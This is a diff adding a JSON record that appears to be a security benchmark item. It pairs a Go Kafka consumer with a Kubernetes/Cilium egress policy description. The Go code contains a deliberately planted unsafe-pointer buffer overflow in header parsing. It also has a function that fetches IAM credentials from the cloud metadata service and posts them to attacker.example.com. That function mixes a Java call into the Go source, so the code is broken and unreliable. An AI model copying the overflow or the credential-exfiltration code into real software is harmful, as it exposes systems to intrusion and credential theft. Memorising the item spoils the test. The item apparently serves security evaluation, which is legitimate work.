@@ -1,0 +1,89 @@
+{
+  "id": "5d0375d9",
+  "language": "go",
+  "code": "package main\n\nimport (\n\t\"context\"\n\t\"encoding/binary\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"net/http\"\n\t\"os\"\n\t\"unsafe\"\n\n\t\"github.com/segmentio/kafka-go\"\n)\n\nconst (\n\tMAX_HEADER_SIZE = 256\n\tBUFFER_SIZE     = 512\n)\n\ntype MessageHeader struct {\n\tMagic     uint32\n\tVersion   uint16\n\tFlags     uint16\n\tPayloadLen uint32\n\tHeaderData [MAX_HEADER_SIZE]byte\n}\n\ntype StreamProcessor struct {\n\treader *kafka.Reader\n\tbuffer [BUFFER_SIZE]byte\n}\n\nfunc NewStreamProcessor(brokers []string, topic, groupID string) *StreamProcessor {\n\tr := kafka.NewReader(kafka.ReaderConfig{\n\t\tBrokers:  brokers,\n\t\tTopic:    topic,\n\t\tGroupID:  groupID,\n\t\tMinBytes: 1,\n\t\tMaxBytes: 10e6,\n\t})\n\treturn &StreamProcessor{reader: r}\n}\n\nfunc (sp *StreamProcessor) parseHeader(raw []byte) (*MessageHeader, error) {\n\tif len(raw) < 12 {\n\t\treturn nil, fmt.Errorf(\"message too short\")\n\t}\n\n\thdr := &MessageHeader{}\n\thdr.Magic = binary.LittleEndian.Uint32(raw[0:4])\n\thdr.Version = binary.LittleEndian.Uint16(raw[4:6])\n\thdr.Flags = binary.LittleEndian.Uint16(raw[6:8])\n\thdr.PayloadLen = binary.LittleEndian.Uint32(raw[8:12])\n\n\t// Copy header data - length controlled by attacker via PayloadLen field\n\t// BUG: uses PayloadLen instead of actual remaining bytes capped to MAX_HEADER_SIZE\n\theaderDataLen := int(hdr.PayloadLen)\n\tif headerDataLen > 0 && len(raw) > 12 {\n\t\t// Vulnerable: no bounds check against MAX_HEADER_SIZE\n\t\t// Uses unsafe copy that can overflow HeaderData buffer\n\t\tsrc := raw[12:]\n\t\tdst := unsafe.Pointer(&hdr.HeaderData[0])\n\t\tif headerDataLen > len(src) {\n\t\t\theaderDataLen = len(src)\n\t\t}\n\t\t// This copies headerDataLen bytes into a 256-byte fixed buffer\n\t\t// If headerDataLen > 256, we overflow into adjacent memory\n\t\tfor i := 0; i < headerDataLen; i++ {\n\t\t\t*(*byte)(unsafe.Pointer(uintptr(dst) + uintptr(i))) = src[i]\n\t\t}\n\t}\n\n\treturn hdr, nil\n}\n\nfunc (sp *StreamProcessor) exfiltrateToMetadata(data []byte) {\n\t// After buffer overflow corrupts control flow or leaks data,\n\t// attacker's shellcode/ROP chain calls back to cloud metadata service\n\tmetadataURL := \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n\tresp, err := http.Get(metadataURL)\n\tif err != nil {\n\t\tlog.Printf(\"metadata fetch failed: %v\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\tcreds, _ := ioutil.ReadAll(resp.Body)\n\t// Exfiltrate credentials\n\thttp.Post(\"http://attacker.example.com/exfil\", \"application/json\", \n\t\tjava.io.ByteArrayInputStream(creds)) // simplified\n\t_ = creds\n}\n\nfunc (sp *StreamProcessor) ProcessMessages(ctx context.Context) error {\n\tfor {\n\t\tselect {\n\t\tcase <-ctx.Done():\n\t\t\treturn ctx.Err()\n\t\tdefault:\n\t\t\tmsg, err := sp.reader.ReadMessage(ctx)\n\t\t\tif err != nil {\n\t\t\t\tlog.Printf(\"read error: %v\", err)\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\thdr, err := sp.parseHeader(msg.Value)\n\t\t\tif err != nil {\n\t\t\t\tlog.Printf(\"parse error: %v\", err)\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tlog.Printf(\"Processed message: magic=0x%x version=%d flags=0x%x\",\n\t\t\t\thdr.Magic, hdr.Version, hdr.Flags)\n\t\t}\n\t}\n}\n\nfunc main() {\n\tbrokers := []string{os.Getenv(\"KAFKA_BROKERS\")}\n\ttopic := os.Getenv(\"KAFKA_TOPIC\")\n\tgroupID := os.Getenv(\"KAFKA_GROUP_ID\")\n\n\tsp := NewStreamProcessor(brokers, topic, groupID)\n\tif err := sp.ProcessMessages(context.Background()); err != nil {\n\t\tlog.Fatalf(\"processor exited: %v\", err)\n\t}\n}",
+  "environment": {
+    "description": "Pod deployed in namespace 'stream-processing' with a Cilium-managed NetworkPolicy. The policy spec uses a combination of egress rules: allows TCP to Kafka broker CIDR (10.0.32.0/24) on ports 9092-9094, allows DNS resolution to kube-dns (UDP/53), and applies a default-deny egress posture via a baseline policy with an empty egress array. The L3/L4 filter entries are compiled into eBPF datapath maps on the node, meaning even if the process attempts raw socket connections, the kernel-level enforcement drops packets to 169.254.169.254/32 before they leave the veth pair. Additionally, the node's iptables FORWARD chain has a Cilium-inserted rule at position 1 that jumps to CILIUM_FORWARD which only permits flows matching BPF policy verdicts.",
+    "config": {
+      "kubernetes_namespace": "stream-processing",
+      "network_policy_engine": "cilium v1.14.2",
+      "baseline_policy": {
+        "apiVersion": "networking.k8s.io/v1",
+        "kind": "NetworkPolicy",
+        "metadata": {
+          "name": "default-deny-egress",
+          "namespace": "stream-processing"
+        },
+        "spec": {
+          "podSelector": {},
+          "policyTypes": [
+            "Egress"
+          ],
+          "egress": []
+        }
+      },
+      "allow_policy": {
+        "apiVersion": "cilium.io/v2",
+        "kind": "CiliumNetworkPolicy",
+        "metadata": {
+          "name": "stream-processor-egress",
+          "namespace": "stream-processing"
+        },
+        "spec": {
+          "endpointSelector": {
+            "matchLabels": {
+              "app": "stream-processor"
+            }
+          },
+          "egress": [
+            {
+              "toEndpoints": [
+                {
+                  "matchLabels": {
+                    "k8s:io.kubernetes.pod.namespace": "kube-system",
+                    "k8s-app": "kube-dns"
+                  }
+                }
+              ],
+              "toPorts": [
+                {
+                  "ports": [
+                    {
+                      "port": "53",
+                      "protocol": "UDP"
+                    }
+                  ]
+                }
+              ]
+            },
+            {
+              "toCIDR": [
+                "10.0.32.0/24"
+              ],
+              "toPorts": [
+                {
+                  "ports": [
+                    {
+                      "port": "9092",
+                      "protocol": "TCP"
+                    },
+                    {
+                      "port": "9093",
+                      "protocol": "TCP"
+                    },
+                    {
+                      "port": "9094",
+                      "protocol": "TCP"
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      },
+      "ebpf_enforcement": true,
+      "imds_access": "blocked at datapath level - no egress rule permits 169.254.169.254/32"
+    }
+  }
+}
